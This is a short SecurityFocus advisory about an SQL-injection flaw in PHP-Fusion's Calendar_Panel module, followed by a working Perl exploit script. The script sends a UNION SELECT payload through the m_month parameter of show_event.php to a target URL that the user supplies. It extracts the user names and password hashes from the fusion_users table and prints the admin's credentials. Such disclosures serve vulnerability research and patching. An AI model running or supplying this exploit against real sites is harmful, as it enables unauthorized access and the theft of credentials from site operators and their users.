source: http://www.securityfocus.com/bid/23225/info

PHP-Fusion is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation. This issue may help the attacker gain unauthorized access.

#!/usr/bin/perl -w

# PHP-Fusion 'Calendar_Panel' Module show_event.PHP (m_month) SQL Injection
Exploit And PoC

# Type :

# SQL Injection

# Release Date :

# {2007-03-31}

# Product :

# http://php-fusion.co.uk/

# Bug :

# http://localhost/script/modules/articles/print.php?id=x AND 1=1 or 1=0

# PoC :

#
http://localhost/script/infusions/calendar_panel/show_event.php?m_month=-1/**/UNI
ON/**/SELECT/**/0,1,user_password,user_name,4,5,6,7,8,9,10,11/**/FROM/**/fusion_u
sers/*


use LWP::Simple;

if(!$ARGV[0] or !($ARGV[0]=~m/http/))

{
    print "\n-----------------------------------\n";
    print "PHP-Fusion 'Calendar_Panel' Module (m_month) SQL Injection Exploit\n";
    print "-----------------------------------\n";
    print "\nUniquE-Key{UniquE-Cracker}\n";
    print "UniquE[at]UniquE-Key.ORG\n";
    print "http://UniquE-Key.ORG\n";
    print "\n-----------------------------------\n";
    print "\nUsage: $0 <server/path>\n";
    print "Examp: $0 http://www.victim.com/path\n";
    print "\n-----------------------------------\n";
    exit ();
}

$address=q[/infusions/calendar_panel/show_event.php?m_month=-1/**/UNION/**/SELECT
/**/0,1,user_password,user_name,4,5,6,7,8,9,10,11/**/FROM/**/fusion_users/*];
$xmie=get($ARGV[0].$address) || die "\n# Web page not found : $!";
print "\n# Connect to : $ARGV[0]\n";
$xmie=~m/<td width='98%' colspan='4' class='textbox'>(.*?)<\/td>/ && print "\n#
Admin name : $1\n";
print "\n# Exploit Failed\n" if(!$1);
$xmie=~m/<b>(.*?)<\/b><\/font><\/td>/ && print "\n# Password : $1\n";